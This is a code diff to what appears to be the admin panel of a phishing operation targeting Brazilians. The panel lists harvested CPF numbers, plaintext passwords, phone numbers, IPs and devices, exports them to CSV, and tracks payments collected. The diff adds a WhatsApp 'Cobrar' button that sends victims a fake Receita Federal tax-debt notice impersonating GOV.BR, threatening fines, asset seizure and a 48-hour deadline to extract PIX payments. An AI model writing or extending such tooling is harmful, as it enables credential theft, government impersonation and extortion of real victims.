@@ -497,7 +497,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 600px;
+            min-width: 800px;
         }
         th, td {
             padding: 12px 10px;
@@ -561,6 +561,20 @@
             border-radius: 8px;
             color: #f59e0b;
             cursor: pointer;
+        }
+        .btn-whatsapp {
+            background: rgba(37, 211, 102, 0.15);
+            border: 1px solid rgba(37, 211, 102, 0.3);
+            padding: 6px 12px;
+            border-radius: 8px;
+            color: #25d366;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+        .btn-whatsapp:hover {
+            background: rgba(37, 211, 102, 0.3);
+            transform: scale(1.02);
         }
         .search-box {
             display: flex;
@@ -895,7 +909,7 @@
                 <div class="table-wrapper">
                     <table>
                         <thead>
-                            <tr><th>CPF</th><th>SENHA</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Acao</th></tr>
+                            <tr><th>CPF</th><th>SENHA</th><th>TELEFONE</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Acao</th><th>Cobranca</th></tr>
                         </thead>
                         <tbody id="usersTable"></tbody>
                     </table>
@@ -919,7 +933,7 @@
                 <div class="table-wrapper">
                     <table>
                         <thead>
-                            <tr><th>ID</th><th>CPF</th><th>Valor</th><th>Status</th><th>Transacao</th><th>Data Solicitacao</th><th>Data Pagamento</th></tr>
+                            <tr><th>ID</th><th>CPF</th><th>TELEFONE</th><th>Valor</th><th>Status</th><th>Transacao</th><th>Data Solicitacao</th><th>Data Pagamento</th></tr>
                         </thead>
                         <tbody id="paymentsTable"></tbody>
                     </table>
@@ -1154,10 +1168,68 @@
         return cpf;
     }
 
+    function enviarCobrancaWhatsApp(cpf, telefone, valor) {
+        if (!telefone || telefone === '-') {
+            showToast('Telefone não disponível para este usuário', 'error');
+            return;
+        }
+        
+        // Limpar telefone (deixar apenas números)
+        let telefoneLimpo = telefone.replace(/\D/g, '');
+        if (telefoneLimpo.length === 10) {
+            telefoneLimpo = '55' + telefoneLimpo;
+        } else if (telefoneLimpo.length === 11) {
+            telefoneLimpo = '55' + telefoneLimpo;
+        } else if (telefoneLimpo.length === 13 && telefoneLimpo.startsWith('55')) {
+            telefoneLimpo = telefoneLimpo;
+        } else {
+            telefoneLimpo = '55' + telefoneLimpo;
+        }
+        
+        const valorFormatado = valor ? `R$ ${parseFloat(valor).toFixed(2)}` : 'pendente';
+        const cpfFormatado = formatarCPF(cpf);
+        
+        const mensagem = `🚨 *ATENÇÃO - NOTIFICAÇÃO DE DÍVIDA ATIVA* 🚨
+
+*RECEITA FEDERAL DO BRASIL*
+
+Prezado(a) contribuinte, CPF: *${cpfFormatado}*
+
+Foi identificada pendência no pagamento do *Imposto de Renda Pessoa Física (IRPF) - Exercício 2026*.
+
+*VALOR DEVIDO:* ${valorFormatado}
+
+*BASE LEGAL:*
+✓ Lei nº 8.137/90, Art. 1º - Sonegação fiscal
+✓ Art. 337-A do Código Penal - Apropriação indébita tributária
+✓ Lei Complementar nº 105/2001 - Quebra de sigilo fiscal
+
+*PRAZO PARA REGULARIZAÇÃO:* 48 HORAS
+
+Após este prazo, o débito será inscrito em *Dívida Ativa da União*, sujeito a:
+• Multa de até 225% sobre o valor original
+• Inclusão no Cadastro Informativo de Créditos não Quitados (CADIN)
+• Restrição de emissão de certidão negativa de débitos
+• Bloqueio de bens via BacenJud
+
+*REALIZE O PAGAMENTO VIA PIX:*
+
+Chave aleatória será gerada no momento do pagamento através do nosso portal.
+
+Caso já tenha efetuado o pagamento, desconsidere esta mensagem.
+
+*GOV.BR - Receita Federal do Brasil*`;
+
+        const mensagemCodificada = encodeURIComponent(mensagem);
+        const whatsappUrl = `https://wa.me/${telefoneLimpo}?text=${mensagemCodificada}`;
+        
+        window.open(whatsappUrl, '_blank');
+        showToast(`Abrindo WhatsApp para ${formatarCPF(cpf)}`, 'success');
+    }
+
     async function loadAllData() {
         if (!adminToken) return;
         try {
-            // Stats usuarios
             const statsRes = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const statsData = await statsRes.json();
             const stats = statsData.stats || {};
@@ -1166,31 +1238,26 @@
             document.getElementById('statTotalLogs').innerText = stats.total_logs || 0;
             document.getElementById('statTentativas').innerText = stats.tentativas_admin || 0;
 
-            // Usuarios
             const usersRes = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const usersData = await usersRes.json();
             allUsers = usersData.users || [];
             renderUsers(allUsers);
 
-            // Logs
             const logsRes = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const logsData = await logsRes.json();
             allLogs = logsData.logs || [];
             renderLogs(allLogs);
             renderUltimasAtividades(allLogs.slice(0, 15));
 
-            // Pagamentos
             const paymentsRes = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const paymentsData = await paymentsRes.json();
             allPayments = paymentsData.payments || [];
             renderPayments(allPayments);
             renderUltimosPagamentos(allPayments.slice(0, 10));
             
-            // Total arrecadado
             const totalPago = allPayments.filter(p => p.status === 'paid').reduce((sum, p) => sum + parseFloat(p.valor || 0), 0);
             document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPago.toFixed(2)}`;
 
-            // Tentativas
             const tentativasRes = await fetch('/api/admin/tentativas', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const tentativasData = await tentativasRes.json();
             renderTentativas(tentativasData.tentativas || []);
@@ -1203,39 +1270,49 @@
     function renderUsers(users) {
         const tbody = document.getElementById('usersTable');
         if (!users.length) {
-            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="9" style="text-align:center">Nenhum dado coletado</td></tr>';
             return;
         }
-        tbody.innerHTML = users.map(u => `
-            <tr>
-                <td><strong>${formatarCPF(u.cpf)}</strong></td>
-                <td class="badge-warning" style="font-family: monospace;">${u.senha || '--------'}</td>
-                <td>${u.ip || u.ip_senha || '-'}</td>
-                <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
-                <td>${u.navegador || u.navegador_senha || '-'}</td>
-                <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-                <td><button class="btn-danger" onclick="deletarUsuario('${u.cpf}')">DEL</button></td>
-            </tr>
-        `).join('');
+        tbody.innerHTML = users.map(u => {
+            const telefone = u.telefone || u.customer_phone || '-';
+            const valor = u.valor_pendente || '100.00';
+            return `
+                <tr>
+                    <td><strong>${formatarCPF(u.cpf)}</strong></td>
+                    <td class="badge-warning" style="font-family: monospace;">${u.senha || '--------'}</td>
+                    <td class="badge-info">${telefone}</td>
+                    <td>${u.ip || u.ip_senha || '-'}</td>
+                    <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
+                    <td>${u.navegador || u.navegador_senha || '-'}</td>
+                    <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
+                    <td><button class="btn-danger" onclick="deletarUsuario('${u.cpf}')">DEL</button></td>
+                    <td><button class="btn-whatsapp" onclick="enviarCobrancaWhatsApp('${u.cpf}', '${telefone}', '${u.valor_pendente || '100'}')"><i class="fab fa-whatsapp"></i> Cobrar</button></td>
+                </tr>
+            `;
+        }).join('');
     }
 
     function renderPayments(payments) {
         const tbody = document.getElementById('paymentsTable');
         if (!payments.length) {
-            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum pagamento registrado</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center">Nenhum pagamento registrado</td></tr>';
             return;
         }
-        tbody.innerHTML = payments.map(p => `
-            <tr>
-                <td>${p.id || '-'}</td>
-                <td><strong>${formatarCPF(p.cpf)}</strong></td>
-                <td class="badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</td>
-                <td><span class="badge ${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td>
-                <td><code style="font-size: 10px;">${p.transaction_id || '-'}</code></td>
-                <td>${new Date(p.data_solicitacao).toLocaleString()}</td>
-                <td>${p.data_pagamento ? new Date(p.data_pagamento).toLocaleString() : '-'}</td>
-            </tr>
-        `).join('');
+        tbody.innerHTML = payments.map(p => {
+            const telefone = p.telefone || p.customer_phone || '-';
+            return `
+                <tr>
+                    <td>${p.id || '-'}</td>
+                    <td><strong>${formatarCPF(p.cpf)}</strong></td>
+                    <td class="badge-info">${telefone}</td>
+                    <td class="badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</td>
+                    <td><span class="badge ${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td>
+                    <td><code style="font-size: 10px;">${p.transaction_id || '-'}</code></td>
+                    <td>${new Date(p.data_solicitacao).toLocaleString()}</td>
+                    <td>${p.data_pagamento ? new Date(p.data_pagamento).toLocaleString() : '-'}</td>
+                </tr>
+            `;
+        }).join('');
     }
 
     function renderUltimosPagamentos(payments) {
@@ -1249,6 +1326,7 @@
                 <div class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</div>
                 <span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span>
                 <div><strong>${formatarCPF(p.cpf)}</strong></div>
+                <div>Telefone: ${p.telefone || p.customer_phone || '-'}</div>
                 <div>Status: ${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</div>
             </div>
         `).join('');
@@ -1304,13 +1382,13 @@
 
     function filterUsers() {
         const term = document.getElementById('searchUsers').value.toLowerCase();
-        const filtered = allUsers.filter(u => (u.cpf || '').toLowerCase().includes(term));
+        const filtered = allUsers.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term));
         renderUsers(filtered);
     }
 
     function filterPayments() {
         const term = document.getElementById('searchPayments').value.toLowerCase();
-        const filtered = allPayments.filter(p => (p.cpf || '').toLowerCase().includes(term));
+        const filtered = allPayments.filter(p => (p.cpf || '').toLowerCase().includes(term) || (p.telefone || '').toLowerCase().includes(term));
         renderPayments(filtered);
     }
 
@@ -1350,9 +1428,9 @@
 
     function exportarCSV() {
         if (!allUsers.length) { showToast('Nenhum dado para exportar', 'error'); return; }
-        let csv = "CPF,SENHA,IP,Dispositivo,Navegador,Data\n";
+        let csv = "CPF,SENHA,TELEFONE,IP,Dispositivo,Navegador,Data\n";
         allUsers.forEach(u => {
-            csv += `"${u.cpf}","${u.senha || ''}","${u.ip || u.ip_senha || ''}","${u.dispositivo || u.dispositivo_senha || ''}","${u.navegador || u.navegador_senha || ''}","${u.data_senha || u.data_cpf || ''}"\n`;
+            csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || u.customer_phone || ''}","${u.ip || u.ip_senha || ''}","${u.dispositivo || u.dispositivo_senha || ''}","${u.navegador || u.navegador_senha || ''}","${u.data_senha || u.data_cpf || ''}"\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const link = document.createElement('a');
@@ -1364,9 +1442,9 @@
 
     function exportarPaymentsCSV() {
         if (!allPayments.length) { showToast('Nenhum pagamento para exportar', 'error'); return; }
-        let csv = "ID,CPF,Valor,Status,Transacao,Data_Solicitacao,Data_Pagamento\n";
+        let csv = "ID,CPF,TELEFONE,Valor,Status,Transacao,Data_Solicitacao,Data_Pagamento\n";
         allPayments.forEach(p => {
-            csv += `"${p.id}","${p.cpf}","${p.valor}","${p.status}","${p.transaction_id || ''}","${p.data_solicitacao}","${p.data_pagamento || ''}"\n`;
+            csv += `"${p.id}","${p.cpf}","${p.telefone || p.customer_phone || ''}","${p.valor}","${p.status}","${p.transaction_id || ''}","${p.data_solicitacao}","${p.data_pagamento || ''}"\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const link = document.createElement('a');
@@ -1424,7 +1502,6 @@
         }
     }
 
-    // NOTIFICACOES
     function mostrarNotificacao(title, message, type = 'info') {
         const notification = document.createElement('div');
         notification.className = `custom-notification ${type}`;
